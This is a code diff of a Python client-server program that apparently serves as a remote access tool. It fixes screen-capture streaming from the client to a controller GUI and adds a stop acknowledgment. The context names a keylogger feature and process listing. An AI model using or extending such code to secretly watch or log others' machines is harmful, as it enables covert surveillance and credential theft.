@@ -1143,28 +1143,30 @@ class ClientAPP:
 
 
     def screen_share(self):
-        while self.screen_share_toggle:
-            try:
-                if self.screen_share_toggle:
-                    # Capture screen
-                    screenshot = pyautogui.screenshot()
-                    frame = np.array(screenshot)
-                    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
-                    
-                    # Compress frame
-                    _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 30])
-                    buffer_size = len(buffer)
-                    
-                    # Send frame size then data
-                    self.socket.send(struct.pack('L', buffer_size))
-                    self.socket.send(buffer)
-                    sleep(0.033)  # Control frame rate
-                else:
-                    break
-            except Exception as e:
-                print(f"Screen sharing error: {e}")
-                self.screen_share_toggle = False
-                break
+        try:
+            while self.screen_share_toggle:
+                # Capture screen
+                screenshot = pyautogui.screenshot()
+                frame = np.array(screenshot)
+                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+
+                # Compress frame
+                _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 30])
+                buffer_size = len(buffer)
+
+                # Send frame size then data
+                self.socket.send(struct.pack('L', buffer_size))
+                self.socket.send(buffer)
+
+                # Control frame rate
+                time.sleep(0.033)
+
+            self.socket.send(b"ACK_STOP_SCREEN_SHARE")
+        except Exception as e:
+            print(f"Screen sharing error: {e}")
+        finally:
+            self.screen_share_toggle = False
+
 
     def take_screenshot(self, picname):
         try:
@@ -1535,8 +1537,6 @@ class ClientAPP:
                     self.screen_share_toggle = False
                     if self.screen_share_thread:
                         self.screen_share_thread.join(timeout=1)
-                    # self.socket.send('STOP_SCREEN'.encode())
-                    print('STOP KEYWORD SENT')
                 elif cmd == 'GET_PROCESSES':
                     self.show_processes()
                     print('ALL Process Sent')
@@ -2211,10 +2211,11 @@ if __name__ == "__main__":
                 try:
                     self.log("Starting screen share...")
                     selected_client.send(b"START_SCREEN_SHARE")
+
                     self.screen_viewer = tk.Toplevel(self.root)
                     self.screen_viewer.title("Screen Share Viewer")
                     self.screen_viewer.geometry("1024x768")
-                    
+
                     self.screen_canvas = tk.Canvas(
                         self.screen_viewer,
                         bg="black",
@@ -2222,13 +2223,13 @@ if __name__ == "__main__":
                         height=768
                     )
                     self.screen_canvas.pack(fill="both", expand=True)
-                    
+
                     self.screen_viewer_active = True
                     self.receive_screen_updates(selected_client)
                 except Exception as e:
                     self.log(f"Screen share error: {e}")
                     self.stop_screen_share()
-                
+
             self.create_and_start_thread(screen_share_thread, f"screen_share_{random.randint(1000, 9999)}")
 
     def stop_screen_share(self):
@@ -2238,11 +2239,16 @@ if __name__ == "__main__":
                 self.log("Stopping screen share...")
                 try:
                     selected_client.send(b"STOP_SCREEN_SHARE")
-                except:
-                    pass
-                self.screen_viewer_active = False
-                
-            # if self.screen_viewer:
+                    # Wait for client acknowledgment
+                    ack = selected_client.recv(1024)
+                    if ack == b"ACK_STOP_SCREEN_SHARE":
+                        self.log("Screen share stopped by client.")
+                except Exception as e:
+                    self.log(f"Error stopping screen share: {e}")
+
+            self.screen_viewer_active = False
+
+            if hasattr(self, 'screen_viewer') and self.screen_viewer:
                 self.screen_viewer.destroy()
                 self.screen_viewer = None
 
@@ -2253,43 +2259,43 @@ if __name__ == "__main__":
                 if not size_data:
                     break
                 size = struct.unpack('L', size_data)[0]
+
                 frame_data = b""
                 remaining = size
 
-                while True:
+                while remaining > 0:
                     chunk = client_socket.recv(min(remaining, 8192))
                     if not chunk:
                         break
                     frame_data += chunk
                     remaining -= len(chunk)
 
-                nparr = np.frombuffer(frame_data, np.uint8)
-                frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
-                
-                if frame is not None:
-                    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
-                    image = Image.fromarray(frame)
-                    
-                    canvas_width = self.screen_canvas.winfo_width()
-                    canvas_height = self.screen_canvas.winfo_height()
-                    image.thumbnail((canvas_width, canvas_height), Image.Resampling.LANCZOS)
-                    
-                    photo = ImageTk.PhotoImage(image=image)
-                    
-                    self.screen_canvas.delete("all")
-                    self.screen_canvas.create_image(
-                        canvas_width//2,
-                        canvas_height//2,
-                        image=photo,
-                        anchor="center"
-                    )
-                    self.screen_canvas.image = photo
+                if frame_data:
+                    nparr = np.frombuffer(frame_data, np.uint8)
+                    frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
+
+                    if frame is not None:
+                        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+                        image = Image.fromarray(frame)
+
+                        canvas_width = self.screen_canvas.winfo_width()
+                        canvas_height = self.screen_canvas.winfo_height()
+                        image.thumbnail((canvas_width, canvas_height), Image.Resampling.LANCZOS)
+
+                        photo = ImageTk.PhotoImage(image=image)
+                        self.screen_canvas.delete("all")
+                        self.screen_canvas.create_image(
+                            canvas_width // 2,
+                            canvas_height // 2,
+                            image=photo,
+                            anchor="center"
+                        )
+                        self.screen_canvas.image = photo
         except Exception as e:
-            # self.log(f"Screen sharing error: {e}")
+            self.log(f"Screen sharing error: {e}")
+        finally:
             self.stop_screen_share()
-            self.log('Screen Sharing has been Terminated')
-            del chunk
-            return
+
 
     def start_keylogger(self):
         if "keylogger" in self.running_threads:
